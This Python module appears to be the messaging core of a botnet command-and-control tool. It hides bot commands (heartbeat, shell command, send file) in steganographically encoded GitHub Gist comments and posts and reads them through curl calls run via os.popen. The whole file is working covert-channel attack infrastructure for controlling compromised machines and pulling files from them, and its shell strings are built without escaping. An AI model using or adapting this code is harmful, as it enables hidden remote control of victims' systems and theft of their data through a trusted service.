import os
import re
import json
from enum import Enum
import base64
import stegano

INITIALIZED = False
GIT_API_TOKEN = ''
GIST_ID = ''

REFRESH_DELAY = 20 # seconds
BROADCAST = 0
DELIM = '•'

class Command(Enum):
    HEARTBEAT = 0
    CMD = 1
    SEND_FILE = 2


def init_config():
    file = open('config.json', 'r')
    config = json.load(file)
    file.close()

    global GIT_API_TOKEN, GIST_ID, CONTROLLER_IP
    GIT_API_TOKEN = config['GIT_API_TOKEN']
    GIST_ID = config['GIST_ID']

    stegano.init_config(config)

    global INITIALIZED
    INITIALIZED = True


def send_message(message):
    comment = stegano.ensteg(message)
    return post_gist_comment(comment)


def get_fresh_messages(last_seen):
    fresh_comments, last_seen = get_fresh_comments(last_seen)
    messages = [stegano.desteg(comment['body']) for comment in fresh_comments]
    messages = [msg for msg in messages if msg]  # skip comments without a message
    return messages, last_seen


def construct_message(isctrl, bot, cmd, data, respond):
    return DELIM \
        + str(int(isctrl)) + DELIM \
        + str(bot) + DELIM \
        + cmd.name + DELIM \
        + data + DELIM \
        + str(int(respond)) + DELIM


def parse_message(comment):
    try:
        isctrl, bot, cmd, d, r = comment.split(DELIM)[1:6]
        isctrl = bool(int(isctrl))
        bot = int(bot)
        cmd = Command[cmd]
        r = bool(int(r))
        return True, isctrl, bot, cmd, d, r
    
    except:
        return False, None, None, None, None, None


def post_gist_comment(msg):
    assert INITIALIZED

    msg = msg.encode('unicode_escape').decode('utf-8')

    cmd = "curl\
            -X POST \
            -H 'Accept: application/vnd.github+json' \
            -H 'Authorization: Bearer " + GIT_API_TOKEN + "' \
            -H 'X-GitHub-Api-Version: 2022-11-28' \
            \"https://api.github.com/gists/" + GIST_ID + "/comments\" \
            -d '{\"body\":\"" + msg + "\"}' \
        \n"
    cmd = re.sub(' +', ' ', cmd)

    response = perform_command(cmd)
    print()
    return response


def get_last_comment_id():
    _, data = read_last_gist_comments()
    return data[-1]['id']


def get_fresh_comments(last_seen):
    _, data = read_last_gist_comments()

    first_new = len(data)
    for i in reversed(range(len(data))):
        id = data[i]['id']
        if id <= last_seen: break
        first_new = i

    fresh_comments = data[first_new:]
    last_seen = data[-1]['id']
    return fresh_comments, last_seen


# TODO: Last page can contain only few comments.
#       It would be better to request the last two pages.
def read_last_gist_comments():
    headers, data = read_gist_comments()

    hs = parse_http_headers(headers)
    linkfield = hs.get('link', None)
    if linkfield == None:
        return headers, data
    
    ls = parse_field_link(linkfield)
    lastlink = ls.get('last', None)
    if lastlink == None:
        return headers, data
    
    return read_gist_comments(url=lastlink)


def read_gist_comments(page=1, per_page=100, url=None):
    assert INITIALIZED

    if url == None:
        url = "https://api.github.com/gists/" + GIST_ID + "/comments?per_page=" + str(per_page) + "&page=" + str(page)
    
    cmd = "curl -i\
                -H 'Accept: application/vnd.github+json' \
                -H 'Authorization: Bearer " + GIT_API_TOKEN + "' \
                -H 'X-GitHub-Api-Version: 2022-11-28' \
                \"" + url + "\" \
            \n"
    cmd = re.sub(' +', ' ', cmd)

    response = perform_command(cmd)
    print()

    headers, body = response.split('\n\n')
    return headers, json.loads(body)


def parse_http_headers(headers):
    lines = headers.split('\n')
    hs = {}
    for l in lines:
        i = l.find(':')
        if i < 0: continue
        hs[l[:i]] = l[i+2:]
    return hs


def parse_field_link(fielddata):
    fielddata = re.sub(' +', '', fielddata)
    links = fielddata.split(',')
    ls = {}
    for l in links:
        i = l.find(';')
        if i < 0: continue
        ls[l[i+6:-1]] = l[1:i-1]
    return ls


def perform_command(cmd):
    stream = os.popen(cmd)
    out = stream.read()
    return out
